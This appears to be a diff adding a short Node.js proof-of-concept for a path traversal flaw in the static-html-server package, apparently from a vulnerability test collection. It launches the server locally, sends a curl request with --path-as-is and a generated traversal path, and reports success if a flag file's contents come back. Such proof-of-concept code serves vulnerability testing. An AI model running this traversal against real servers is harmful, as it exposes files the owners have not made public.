@@ -1,0 +1,25 @@
+function exploitFunction() {
+    const path = require("path");
+    const { sleep } = require("sleep");
+    const pathToFlag = path.resolve(__dirname, "../flag.html");
+    const fs = require("fs");
+
+    let hostsFile = fs.readFileSync(pathToFlag).toString();
+
+    let server = "node ./node_modules/static-html-server/static-html-server.js";
+    exec(server, (error, stdout) => {});
+
+    sleep.sleep(2);
+
+    let attack_string = `curl -v --path-as-is "http://127.0.0.1:7788${genstr()}"`;
+
+    exec(attack_string, (error, stdout) => {
+        if (stdout === hostsFile) {
+            console.log("Exploit successful!");
+        } else {
+            console.error("Exploit failed.");
+        }
+    });
+}
+
+module.exports = { exploitFunction };
